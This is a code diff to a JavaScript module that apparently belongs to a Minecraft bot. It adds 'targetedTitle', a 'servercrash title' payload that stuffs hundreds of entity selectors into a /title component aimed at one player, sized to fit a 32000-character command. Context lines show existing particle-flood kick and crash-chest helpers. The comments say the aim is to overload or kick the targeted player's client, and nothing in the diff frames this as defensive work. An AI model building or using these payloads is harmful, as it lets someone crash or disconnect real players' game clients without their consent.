@@ -37,6 +37,17 @@ const CJK_LAST = 0x9fff;
 const KICK_TEMPLATE = 'execute at {t} run particle minecraft:flame ~ ~ ~ 0 0 0 0 {n} force {t}';
 const KICK_DEFAULT = 2e9;
 
+// The `servercrash title` payload, aimed at `{t}` instead of `@a`: the title
+// component carries a stack of entity selectors, each resolved server-side when
+// the title is rendered, so one `/title <player> title` packet asks the server
+// for `count` of them at once. The packet goes to that player alone, so only
+// their client builds the oversized title and the rest of the list never sees
+// it.
+const TITLE_HEAD = 'title {t} title {"text":"phantomSLAY","color":"#ffccee","extra":[';
+const TITLE_TAIL = ']}';
+const ENTITY_SELECTOR = '{"selector":"@e[limit=100]"}';
+const TITLE_DEFAULT = 900;
+
 // Four packets a second while the player is still online: enough that the next
 // one is already queued when the client falls behind on the last, slow enough to
 // stay inside the core's write budget.
@@ -50,6 +61,25 @@ function targetedKick(name, count) {
         ? Math.min(Math.floor(requested), KICK_DEFAULT)
         : KICK_DEFAULT;
     return KICK_TEMPLATE.replaceAll('{t}', target).replaceAll('{n}', String(value));
+}
+
+// The `servercrash title` method, aimed at one name. Each selector costs its own
+// length plus the comma before it, so the count is clamped to what still fits a
+// single core command: core.run() slices at 32000 characters, which would cut a
+// long component into invalid JSON.
+function targetedTitle(name, count) {
+    const target = String(name || '').trim();
+    if (!target) return null;
+
+    const head = TITLE_HEAD.replaceAll('{t}', target);
+    const requested = Math.floor(Number(count));
+    const room = COMMAND_LIMIT - head.length - TITLE_TAIL.length + 1;
+    const fits = Math.floor(room / (ENTITY_SELECTOR.length + 1));
+    const asked = Number.isFinite(requested) && requested > 0 ? requested : TITLE_DEFAULT;
+    const value = Math.min(asked, fits);
+    if (value < 1) return null;
+
+    return `${head}${new Array(value).fill(ENTITY_SELECTOR).join(',')}${TITLE_TAIL}`;
 }
 
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
@@ -142,6 +172,8 @@ module.exports = {
     clampDoublings,
     buildCrashChest,
     targetedKick,
+    targetedTitle,
+    TITLE_DEFAULT,
     KICK_INTERVAL_MS,
     SEED_LENGTH,
     BYTES_PER_CHAR,
